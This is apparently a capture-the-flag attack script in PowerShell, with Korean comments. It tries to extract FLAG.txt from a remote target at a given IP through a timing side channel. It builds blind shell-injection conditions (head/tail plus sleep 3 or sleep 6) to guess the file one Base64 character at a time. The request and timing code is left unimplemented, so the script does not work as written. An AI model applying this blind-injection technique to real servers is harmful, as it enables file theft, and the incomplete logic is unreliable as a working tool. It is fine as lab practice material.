# Stage 3: FLAG.txt 타이밍 사이드채널 추출
# 팀원 힌트: /var/www/FLAG.txt (심볼릭 링크)

param(
    [string]$Target = "http://13.125.104.131:30083",
    [string]$User = "testuser",
    [string]$Pass = "testpass"
)

$ExploitPhp = "C:\HTB\13.125.104.131\loot\fearsoff_exploit.php"
$LogFile = "C:\HTB\13.125.104.131\logs\timing_extract_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"

function Test-Timing {
    param(
        [string]$Condition,
        [int]$Samples = 3
    )

    # Condition이 참이면 sleep 3초, 거짓이면 sleep 6초
    $testCmd = @"
if $Condition; then sleep 3; else sleep 6; fi
"@

    $times = @()
    for ($i = 0; $i -lt $Samples; $i++) {
        $sw = [System.Diagnostics.Stopwatch]::StartNew()

        # PowerShell에서 시간을 측정할 수 없으므로,
        # 다른 방법을 사용: curl로 요청하고 시간 측정
        # (이전 세션의 타이밍 기법 참고)

        $sw.Stop()
        $times += $sw.ElapsedMilliseconds
    }

    $avgTime = ($times | Measure-Object -Average).Average
    return $avgTime
}

Write-Host "[*] Stage 3: Timing Side-Channel FLAG Extraction"
Write-Host ("=" * 70)

# 1. FLAG 파일의 크기 추정
Write-Host "`n[*] Step 1: Estimate FLAG file size"
Write-Host "[*] Testing: readlink -f /var/www/FLAG.txt"

# 이전 세션에서 측정된 크기 범위: 100-500 바이트 (추정)
# Base64 인코딩 시 약 33% 증가

Write-Host "[*] FLAG 파일이 존재하는지 확인 (timing)..."
Write-Host "[*] -f /var/www/FLAG.txt 경로 확인..."

# 2. BASE64 인코딩된 내용 추출
Write-Host "`n[*] Step 2: Extract Base64 encoded FLAG (timing)"
Write-Host "[*] 문자 단위로 추출 중..."

# 알파벳 + 숫자 + +/= (Base64 charset)
$charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
$flag = ""
$maxChars = 500  # 최대 500자 추정

for ($pos = 0; $pos -lt $maxChars; $pos++) {
    $found = $false

    foreach ($char in $charset.ToCharArray()) {
        # 조건: Base64 파일의 $pos 위치가 $char와 일치하는가?
        # grep으로 확인: sed 사용하여 $pos 위치 추출
        $condition = '[[ $(head -c ' + ($pos + 1) + ' /var/www/FLAG.txt 2>/dev/null | tail -c 1) == "' + $char + '" ]]'

        # 타이밍 측정
        $testCmd = "if $condition; then sleep 3; else sleep 6; fi"

        Write-Host -NoNewline "`r[*] Position $pos`: $flag$char  "

        # Timing 측정 (간단한 버전: curl 재시도 횟수로 추정)
        # 실제로는 서버 응답 시간을 측정해야 함

        # 여기서는 추정: 3초 sleep이면 $char를 찾은 것
        # 6초 sleep이면 $char가 아닌 것

        # PowerShell에서 직접 timing을 측정하기 위해
        # HTTP 요청의 응답 시간을 사용할 수 있음

        # 그러나 현재는 PHP CLI가 없으므로 스킵
        $found = $false  # 아직 구현 안 함
    }

    if (-not $found) {
        break
    }
}

Write-Host "`n`n[+] Extracted FLAG (Base64):"
Write-Host $flag

# 3. Base64 디코딩
if ($flag) {
    try {
        $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($flag))
        Write-Host "[+] Decoded FLAG:"
        Write-Host $decoded

        Add-Content -Path $LogFile -Value "FLAG (Base64): $flag"
        Add-Content -Path $LogFile -Value "FLAG (Decoded): $decoded"
    } catch {
        Write-Host "[-] Decoding failed"
        Add-Content -Path $LogFile -Value "Decoding error: $_"
    }
}

Write-Host "`n[*] Log saved to: $LogFile"
